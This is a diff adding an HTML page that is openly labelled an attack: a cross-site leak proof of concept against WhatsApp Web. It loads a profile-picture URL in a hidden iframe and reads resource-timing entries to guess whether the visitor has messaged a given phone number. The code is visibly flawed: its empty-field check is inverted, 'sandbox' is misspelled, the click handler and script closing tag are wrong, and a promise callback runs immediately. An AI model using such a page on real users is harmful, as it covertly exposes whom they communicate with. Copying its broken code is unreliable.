@@ -1,0 +1,45 @@
+<html>
+<body id='body'>
+<form>
+https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timestamp">
+<button type="button" action="attack();">Attack</button>
+</form>
+<p id='result'></p>
+<script>
+  function send(url){ 
+	    return new Promise(function(resolve,reject){
+            var iframe = document.createElement("iframe");
+            iframe.setAttribute("hidden", true);
+            iframe.setAttribute("sanbox", "allow-same-origin");
+            document.getElementById('body').appendChild(iframe);
+            iframe.onload = function(event) {
+                iframe.remove();
+                resolve("done");
+            }
+            iframe.src = url
+		  });
+	}
+
+	function result(url){
+		if (performance.getEntriesByName(url).length==1)
+			document.getElementById("result").innerHTML = "You had communicated with this specified phone number";
+		else
+			document.getElementById("result").innerHTML = "Communication with this phone number not found";
+	}
+  
+  function attack(){
+      var number = document.getElementById("number").value;
+      var timestamp = document.getElementById("timestamp").value;
+      var url = "https://web.whatsapp.com/pp?t=s&u="+number+"%40c.us&i="+timestamp;
+      if (number=="" || timestamp==""){
+        performance.clearResourceTimings()
+        send(url).then(result(url));
+      } else {
+         document.getElementById("result").innerHTML = "You should fill both URL and Timestamp textfields";
+      }
+  }
+  
+  
+<script>
+</body>
+</html>
